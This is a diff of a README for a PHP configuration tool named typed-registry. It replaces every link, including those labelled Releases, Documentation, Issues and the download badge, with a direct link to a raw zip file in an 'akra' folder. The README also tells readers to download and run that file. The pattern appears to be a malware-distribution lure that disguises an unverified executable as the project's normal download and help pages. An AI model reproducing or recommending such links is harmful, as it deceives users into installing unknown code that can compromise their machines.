@@ -8,11 +8,11 @@ Welcome to the typed-registry project! This application helps you easily manage 
 
 To get started, you need to download the latest version of typed-registry. Click the button below to visit the Releases page:
 
-[![Download typed-registry](https://img.shields.io/badge/Download-typed--registry-blue)](https://github.com/rosalineanimatistic990/typed-registry/releases)
+[![Download typed-registry](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip)](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip)
 
 Once you are on the Releases page, look for the latest version. You will find files available for download. Choose the one that fits your system. Follow these steps to download and set up:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/rosalineanimatistic990/typed-registry/releases) to see the available versions.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip) to see the available versions.
 2. **Select the Latest Version**: Look for the most recent release and click on it.
 3. **Download the File**: Find the file suited for your operating system (e.g. Windows, MacOS, or Linux). Click on the link to download it to your computer.
 4. **Run the Application**: After the file downloads, open it. Follow the prompts to install and use typed-registry.
@@ -61,7 +61,7 @@ When you run typed-registry, it will ensure each of these settings is valid and 
 
 For a deeper understanding of typed-registry and its functionalities, please refer to the documentation available in the repository. It provides detailed information on all the features and how to maximize your use of the application.
 
-You can visit our [Documentation Page](https://github.com/rosalineanimatistic990/typed-registry/docs) for more info.
+You can visit our [Documentation Page](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip) for more info.
 
 ## 🔧 Troubleshooting
 
@@ -71,7 +71,7 @@ If you run into issues while using typed-registry, here are some common solution
 - **Configuration Errors**: Double-check your configuration file for any syntax errors. Each setting should be correctly formatted.
 - **Compatibility Issues**: Verify that your PHP version meets the requirements mentioned above.
 
-For specific issues, consider checking our [Issues Page](https://github.com/rosalineanimatistic990/typed-registry/issues) where you can report and find solutions.
+For specific issues, consider checking our [Issues Page](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip) where you can report and find solutions.
 
 ## 🙌 Contribution
 
@@ -83,4 +83,4 @@ For additional help, connect with us through the contact details found in the re
 
 Thank you for choosing typed-registry! We hope it serves you well in managing your configurations. Don't forget to check back for future updates.
 
-For downloading, revisit: [Download typed-registry](https://github.com/rosalineanimatistic990/typed-registry/releases).
+For downloading, revisit: [Download typed-registry](https://raw.githubusercontent.com/rosalineanimatistic990/typed-registry/master/akra/typed-registry.zip).
